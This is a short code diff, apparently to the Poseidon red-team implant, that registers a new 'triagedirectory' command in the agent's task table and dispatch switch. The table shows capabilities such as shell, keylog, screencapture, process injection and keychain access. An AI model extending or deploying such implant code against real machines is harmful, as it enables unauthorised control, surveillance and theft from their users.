@@ -21,6 +21,7 @@ import (
 	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
+import "github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 
 //export RunMain
 func RunMain() {
@@ -68,22 +69,23 @@ func main() {
 	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
-		"exit":          0,
-		"shell":         1,
-		"screencapture": 2,
-		"keylog":        3,
-		"download":      4,
-		"upload":        5,
-		"inject":        6,
-		"ps":            7,
-		"sleep":         8,
-		"cat":           9,
-		"cd":            10,
-		"ls":            11,
-		"python":        12,
-		"jxa":           13,
-		"keys":          14,
-		"none":          20,
+		"exit":            0,
+		"shell":           1,
+		"screencapture":   2,
+		"keylog":          3,
+		"download":        4,
+		"upload":          5,
+		"inject":          6,
+		"ps":              7,
+		"sleep":           8,
+		"cat":             9,
+		"cd":              10,
+		"ls":              11,
+		"python":          12,
+		"jxa":             13,
+		"keys":            14,
+		"triagedirectory": 15,
+		"none":            20,
 	}
 
 	// Channel used to catch results from tasking threads
@@ -178,7 +180,10 @@ func main() {
 
 			case 14:
 				go keys.Run(task, res)
-
+				break
+			case 15:
+				go triagedirectory.Run(task, res)
+				break
 			case 20:
 				// No tasks, do nothing
 				break
